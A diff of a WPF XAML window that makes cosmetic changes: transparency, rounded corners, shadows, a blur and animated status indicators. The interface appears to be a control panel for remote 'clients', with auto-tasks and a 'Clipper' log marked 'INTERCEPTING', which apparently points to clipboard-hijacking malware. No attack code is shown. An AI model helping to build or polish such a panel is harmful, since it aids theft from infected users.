@@ -10,13 +10,9 @@
         WindowStyle="None"
         UseLayoutRounding="True"
         RenderOptions.ClearTypeHint="Enabled"
-        Background="#0C0D18"
+        AllowsTransparency="True"
+        Background="Transparent"
         MouseLeftButtonDown="Window_MouseLeftButtonDown">
-
-    <WindowChrome.WindowChrome>
-        <WindowChrome CaptionHeight="0" ResizeBorderThickness="4"
-                      GlassFrameThickness="0" CornerRadius="0"/>
-    </WindowChrome.WindowChrome>
 
     <Window.Resources>
         <BooleanToVisibilityConverter x:Key="BoolToVis" />
@@ -95,6 +91,9 @@
                     <ControlTemplate TargetType="ContextMenu">
                         <Border Background="#0F1020" BorderBrush="#1E2038" BorderThickness="1"
                                 CornerRadius="10" Padding="4">
+                            <Border.Effect>
+                                <DropShadowEffect BlurRadius="28" ShadowDepth="8" Opacity="0.75" Color="#000000"/>
+                            </Border.Effect>
                             <ItemsPresenter/>
                         </Border>
                     </ControlTemplate>
@@ -111,7 +110,7 @@
                     <ControlTemplate TargetType="MenuItem">
                         <Grid>
                             <!-- Item row -->
-                            <Border x:Name="bd" Background="#0C0D18" CornerRadius="5" Margin="1,1">
+                            <Border x:Name="bd" Background="Transparent" CornerRadius="5" Margin="1,1">
                                 <Grid>
                                     <Grid.ColumnDefinitions>
                                         <ColumnDefinition Width="28"/>
@@ -131,10 +130,13 @@
                             <!-- Sub-menu popup (only rendered when item has children) -->
                             <Popup x:Name="PART_Popup"
                                    IsOpen="{Binding IsSubmenuOpen, RelativeSource={RelativeSource TemplatedParent}}"
-                                   Placement="Right" HorizontalOffset="-2" VerticalOffset="-5" Focusable="False"
-                                   AllowsTransparency="False" PopupAnimation="None">
+                                   Placement="Right" HorizontalOffset="-2" VerticalOffset="-5"
+                                   AllowsTransparency="True" Focusable="False" PopupAnimation="Fade">
                                 <Border Background="#0F1020" BorderBrush="#1E2038" BorderThickness="1"
                                         CornerRadius="8" Padding="4" MinWidth="168">
+                                    <Border.Effect>
+                                        <DropShadowEffect BlurRadius="22" ShadowDepth="6" Opacity="0.75" Color="#000"/>
+                                    </Border.Effect>
                                     <ItemsPresenter KeyboardNavigation.TabNavigation="Cycle"
                                                     KeyboardNavigation.DirectionalNavigation="Cycle"/>
                                 </Border>
@@ -158,7 +160,7 @@
     </Window.Resources>
 
     <!-- ── Window chrome ──────────────────────────────────────────── -->
-    <Border x:Name="RootBorder" Background="#0C0D18" CornerRadius="0" BorderThickness="0"
+    <Border x:Name="RootBorder" Background="#0C0D18" CornerRadius="8" BorderThickness="1"
             BorderBrush="#1C1E30">
 
         <Grid>
@@ -184,7 +186,11 @@
                        Opacity="0.52"
                        Stretch="Uniform"
                        RenderOptions.BitmapScalingMode="LowQuality"
-                       RenderOptions.CachingHint="Cache"/>
+                       RenderOptions.CachingHint="Cache">
+                    <Image.Effect>
+                        <BlurEffect x:Name="BgLogoBlur" Radius="2"/>
+                    </Image.Effect>
+                </Image>
 
             </Grid>
 
@@ -244,15 +250,37 @@
                 </Grid>
             </Border>
 
-            <!-- ── Accent line (static — animation disabled to prevent Hyper-V scan-line artifacts) -->
+            <!-- ── Accent line: full-width repeating aurora ─────────── -->
             <Rectangle x:Name="AuroraBar" Grid.Row="1" Height="3">
                 <Rectangle.Fill>
-                    <LinearGradientBrush StartPoint="0,0" EndPoint="1,0">
-                        <GradientStop Color="#4A85F5" Offset="0.0"/>
-                        <GradientStop Color="#7C5CE8" Offset="0.5"/>
-                        <GradientStop Color="#4A85F5" Offset="1.0"/>
+                    <LinearGradientBrush MappingMode="Absolute"
+                                         StartPoint="0,0" EndPoint="600,0"
+                                         SpreadMethod="Repeat">
+                        <LinearGradientBrush.Transform>
+                            <TranslateTransform X="0"/>
+                        </LinearGradientBrush.Transform>
+                        <GradientStop Color="#4A85F5" Offset="0.00"/>
+                        <GradientStop Color="#0DCCFF" Offset="0.20"/>
+                        <GradientStop Color="#7C5CE8" Offset="0.42"/>
+                        <GradientStop Color="#D040FF" Offset="0.58"/>
+                        <GradientStop Color="#7C5CE8" Offset="0.76"/>
+                        <GradientStop Color="#0DCCFF" Offset="0.90"/>
+                        <GradientStop Color="#4A85F5" Offset="1.00"/>
                     </LinearGradientBrush>
                 </Rectangle.Fill>
+                <Rectangle.Triggers>
+                    <EventTrigger RoutedEvent="Rectangle.Loaded">
+                        <BeginStoryboard>
+                            <Storyboard>
+                                <DoubleAnimation
+                                    Storyboard.TargetName="AuroraBar"
+                                    Storyboard.TargetProperty="(Rectangle.Fill).(LinearGradientBrush.Transform).(TranslateTransform.X)"
+                                    From="0" To="-600" Duration="0:0:5"
+                                    RepeatBehavior="Forever"/>
+                            </Storyboard>
+                        </BeginStoryboard>
+                    </EventTrigger>
+                </Rectangle.Triggers>
             </Rectangle>
 
             <!-- ── Control bar ────────────────────────────────────── -->
@@ -279,8 +307,33 @@
                             BorderThickness="1" BorderBrush="#1C1E30"
                             VerticalAlignment="Center" HorizontalAlignment="Center">
                         <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
-                            <Ellipse x:Name="ServerDot" Width="8" Height="8" Fill="#EF4444"
-                                     VerticalAlignment="Center" Margin="0,0,6,0"/>
+                            <Grid Width="16" Height="16" VerticalAlignment="Center" Margin="0,0,6,0">
+                                <Ellipse x:Name="ServerPulse" Stroke="#EF4444" StrokeThickness="1.2"
+                                         Fill="Transparent" Opacity="0" RenderTransformOrigin="0.5,0.5">
+                                    <Ellipse.RenderTransform>
+                                        <ScaleTransform x:Name="PulseScale"/>
+                                    </Ellipse.RenderTransform>
+                                </Ellipse>
+                                <Ellipse x:Name="ServerDot" Width="7" Height="7" Fill="#EF4444"
+                                         HorizontalAlignment="Center" VerticalAlignment="Center"/>
+                                <Grid.Triggers>
+                                    <EventTrigger RoutedEvent="Grid.Loaded">
+                                        <BeginStoryboard>
+                                            <Storyboard RepeatBehavior="Forever">
+                                                <DoubleAnimation Storyboard.TargetName="PulseScale"
+                                                                 Storyboard.TargetProperty="ScaleX"
+                                                                 From="0.4" To="2.2" Duration="0:0:1.4"/>
+                                                <DoubleAnimation Storyboard.TargetName="PulseScale"
+                                                                 Storyboard.TargetProperty="ScaleY"
+                                                                 From="0.4" To="2.2" Duration="0:0:1.4"/>
+                                                <DoubleAnimation Storyboard.TargetName="ServerPulse"
+                                                                 Storyboard.TargetProperty="Opacity"
+                                                                 From="0.65" To="0.0" Duration="0:0:1.4"/>
+                                            </Storyboard>
+                                        </BeginStoryboard>
+                                    </EventTrigger>
+                                </Grid.Triggers>
+                            </Grid>
                             <TextBlock x:Name="TxtServerStatus" Text="Stopped"
                                        Foreground="#606880" FontSize="12" />
                             <TextBlock x:Name="TxtClientCount" Text="  ·  0 clients"
@@ -299,7 +352,7 @@
             </Border>
 
             <!-- ── Tab control ────────────────────────────────────── -->
-            <TabControl x:Name="MainTabControl" Grid.Row="3" Background="#0C0D18" BorderThickness="0"
+            <TabControl x:Name="MainTabControl" Grid.Row="3" Background="Transparent" BorderThickness="0"
                         Foreground="{StaticResource TextBrush}"
                         SelectionChanged="MainTabControl_SelectionChanged">
                 <TabControl.Template>
@@ -349,7 +402,7 @@
                             <Setter.Value>
                                 <ControlTemplate TargetType="TabItem">
                                     <Grid x:Name="root" Cursor="Hand">
-                                        <Border x:Name="bd" Background="#0C0D18"
+                                        <Border x:Name="bd" Background="Transparent"
                                                 Padding="{TemplateBinding Padding}" />
                                         <ContentPresenter ContentSource="Header"
                                                           HorizontalAlignment="Center"
@@ -484,7 +537,8 @@
                                     <TextBlock Grid.Column="0" Text="⌕" FontSize="16"
                                                HorizontalAlignment="Center" VerticalAlignment="Center"
                                                Foreground="#606880" />
-                                    <TextBox Grid.Column="1" x:Name="TxtSearch" Background="#0C0D18" Foreground="#DDE0F0"
+                                    <TextBox Grid.Column="1" x:Name="TxtSearch"
+                                             Background="Transparent" Foreground="#DDE0F0"
                                              BorderThickness="0" Padding="0,9"
                                              FontSize="12" CaretBrush="#4A85F5" SelectionBrush="#4A85F5"
                                              VerticalContentAlignment="Center"
@@ -514,7 +568,8 @@
 
                             <DataGrid Grid.Row="1" x:Name="GridClients"
                                       AutoGenerateColumns="False" IsReadOnly="True"
-                                      PreviewKeyDown="GridClients_PreviewKeyDown" Background="#0C0D18" Foreground="#DDE0F0"
+                                      PreviewKeyDown="GridClients_PreviewKeyDown"
+                                      Background="Transparent" Foreground="#DDE0F0"
                                       BorderThickness="0" RowBackground="Transparent"
                                       AlternatingRowBackground="#07101428"
                                       GridLinesVisibility="None" HeadersVisibility="Column"
@@ -655,7 +710,8 @@
                         </Border.BorderBrush>
                         <Grid>
                             <DataGrid x:Name="GridAllClients"
-                                      AutoGenerateColumns="False" IsReadOnly="True" Background="#0C0D18" Foreground="#DDE0F0"
+                                      AutoGenerateColumns="False" IsReadOnly="True"
+                                      Background="Transparent" Foreground="#DDE0F0"
                                       BorderThickness="0" RowBackground="Transparent"
                                       AlternatingRowBackground="#07101428"
                                       GridLinesVisibility="None" HeadersVisibility="Column"
@@ -1250,7 +1306,8 @@
                             </StackPanel>
 
                             <DataGrid x:Name="GridAutoTasks" Grid.Row="1"
-                                      AutoGenerateColumns="False" IsReadOnly="True" Background="#0C0D18" Foreground="#DDE0F0"
+                                      AutoGenerateColumns="False" IsReadOnly="True"
+                                      Background="Transparent" Foreground="#DDE0F0"
                                       BorderThickness="0" RowBackground="Transparent"
                                       AlternatingRowBackground="#07101428"
                                       GridLinesVisibility="None" HeadersVisibility="Column"
@@ -1476,7 +1533,8 @@
                                                FontSize="12" FontWeight="SemiBold" Foreground="#303560"
                                                Margin="0,0,0,10"/>
                                     <Button HorizontalAlignment="Center" Cursor="Hand"
-                                            Click="TelegramLink_Click" Background="#0C0D18" BorderThickness="0" Padding="0">
+                                            Click="TelegramLink_Click"
+                                            Background="Transparent" BorderThickness="0" Padding="0">
                                         <Button.Template>
                                             <ControlTemplate TargetType="Button">
                                                 <Border x:Name="TgBorder" CornerRadius="14" Padding="28,15"
@@ -1493,6 +1551,10 @@
                                                             <GradientStop Color="#704A85F5" Offset="1"/>
                                                         </LinearGradientBrush>
                                                     </Border.BorderBrush>
+                                                    <Border.Effect>
+                                                        <DropShadowEffect Color="#2CA5E0" BlurRadius="22"
+                                                                          ShadowDepth="0" Opacity="0.30"/>
+                                                    </Border.Effect>
                                                     <StackPanel Orientation="Horizontal" VerticalAlignment="Center">
                                                         <Image Source="/telegram.png" Width="24" Height="24"
                                                                VerticalAlignment="Center" Margin="0,0,12,0"
@@ -1577,7 +1639,9 @@
                                                     Background="#0A1E10" BorderBrush="#1A5E28" BorderThickness="1"
                                                     Padding="8,3" Visibility="Collapsed" VerticalAlignment="Center">
                                                 <StackPanel Orientation="Horizontal">
-                                                    <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0"/>
+                                                    <Ellipse Width="5" Height="5" Fill="#22C55E" VerticalAlignment="Center" Margin="0,0,5,0">
+                                                        <Ellipse.Effect><DropShadowEffect Color="#22C55E" BlurRadius="6" ShadowDepth="0" Opacity="1"/></Ellipse.Effect>
+                                                    </Ellipse>
                                                     <TextBlock Text="INTERCEPTING" Foreground="#22C55E" FontSize="9" FontWeight="Bold" FontFamily="Consolas"/>
                                                 </StackPanel>
                                             </Border>
@@ -1613,7 +1677,8 @@
                                         </Grid>
                                         <ScrollViewer x:Name="ClipperLogScroll" VerticalScrollBarVisibility="Auto"
                                                       Height="100" DockPanel.Dock="Top" Margin="0,0,0,8">
-                                            <TextBox x:Name="ClipperLog" Background="#0C0D18" Foreground="#4AE870"
+                                            <TextBox x:Name="ClipperLog"
+                                                     Background="Transparent" Foreground="#4AE870"
                                                      FontFamily="Consolas" FontSize="11"
                                                      BorderThickness="0" Padding="12,4"
                                                      IsReadOnly="True" TextWrapping="Wrap"
